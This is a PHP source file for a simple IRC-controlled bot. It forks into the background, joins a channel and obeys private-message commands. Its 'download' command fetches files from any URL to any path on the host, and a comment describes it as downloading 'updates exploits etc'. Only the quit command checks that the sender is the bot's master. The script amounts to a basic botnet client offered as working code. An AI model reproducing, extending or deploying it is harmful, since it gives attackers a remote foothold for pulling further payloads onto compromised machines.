<?php

function fork() {
/* 
This forks the process to the background 
N.B This doesnt work on windows!!
*/

$pid = pcntl_fork();
   if ($pid == -1) {
   	 die("could not fork");
   } else if ($pid) {
         echo "I am the parent, pid = ". $pid ."\n";
         exit;
   } else {
         echo "I am the child, pid = ". $pid ."\n";
   } 

}

function down_file($url,$file) {
/* This function downloads updates exploits etc */

$ch = curl_init("$url");
$fp = fopen("$file", "w");

curl_setopt($ch, CURLOPT_FILE, $fp);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_exec($ch);
curl_close($ch);

fclose($fp);

}


function connect($server,$port,$channel,$botnick,$master) {
/* This Function connects to the irc server and registers the bot on the server */

$connect = NULL;
$fp = fsockopen ("$server", "$port", $errno, $errstr, 30);
if (!$fp) {
    echo "$errstr ($errno)<br>";
  } else {
     if ($connect == NULL) {
       fputs ($fp, "nick $botnick\n\n");
       fputs ($fp, "USER $botnick localhost localhost Shhhh :l33t\n\n");
       sleep(5);
       fputs ($fp, "JOIN $channel\n\n");
       $connect = 1;

     }
     return $fp;
  }

}


function log_it($user,$msg) {

   if ($user != '') {
	   $file = fopen("chat.log","aw");
	   fwrite( $file, "<$user> $msg\n" );
	   fclose($file);
   } else {
	   $file = fopen("irc.log","aw");
	   fwrite( $file, "$msg" );
	   fclose($file);
  }
}

function command($user,$command,$channel,$master,$target,$msg) {

        if (($command == "Quit") && ($user == $master)) {
           return "QUIT Cheers ppl!!\n\n";
         }
         if ($command == "hi") {
           return "PRIVMSG $channel :Hi everyone\n\n";
         }
         if ($command == "opme") {
           return "MODE $channel +o $user\n\n";
         }
	if ($command == "deop") {
           return "MODE $channel -o $user\n\n";
         }

         if (($command == "ctcp") && ($target != '')) {
           return "PRIVMSG $target :" . chr(001) . "VERSION" . chr(001) . "\n\n";                       
         } 
         if (($command == "nick") && ($target != '')) {
           return "NICK $target\n\n";                       
         } 
         if (($command == "action") && ($target != '')) {
           return "PRIVMSG $channel :" . chr(001) . "ACTION $target" . chr(001) . "\n\n";                       
//\001ACTION barfs on the floor.\001
         } 
         if (($command == "download") && ($target != '') && ($msg != '')) {
	 $file = preg_split("/ /",$msg[1]);
	 $file = chop($file[2]);
         down_file($target,$file); 
         return "PRIVMSG $master :Downloading $target too $file\n\n";                       
//\001ACTION barfs on the floor.\001
         } 

}


function main_bot($fp,$master,$channel,$botnick) {

while (!feof($fp)) {

  $message = fgets($fp,250);

  if (preg_match("/ PRIVMSG ".$botnick." :/", $message)) {
       $msg = preg_split("/ PRIVMSG ".$botnick." :/", $message);
       $user = preg_split("/!/", $msg[0]);
       $user = preg_split("/:/", $user[0]);
       $user = $user[1];      

       $command = chop($msg[1]);
       $command = preg_split("/ /",$command);
       if ($command[1]) {
           $target = $command[1];
       };
       $command = $command[0];

       $def = command($user,$command,$channel,$master,$target,$msg);

       if ($def != FALSE) {
             fputs ($fp, $def);
       }
  }

if (preg_match("/ PRIVMSG " . $channel . " :/", $message)) {
       $msg = preg_split("/ PRIVMSG " . $channel . " :/", $message);
       $usr = preg_split("/!/", $msg[0]);
       $usr = preg_split("/:/", $usr[0]);
       $usr = $usr[1];      
       $msg = chop($msg[1]);

       log_it($usr,$msg);
  } else {
       log_it('',$message);
}
/*
This next part checks for a server ping
command and replies with a pong to the server
*/
  if (preg_match("/PING :/", $message)) { 

      $pong = str_replace("PING", "PONG", $message);
      fputs ($fp, $pong."\n\n");
  }

}

}


?>
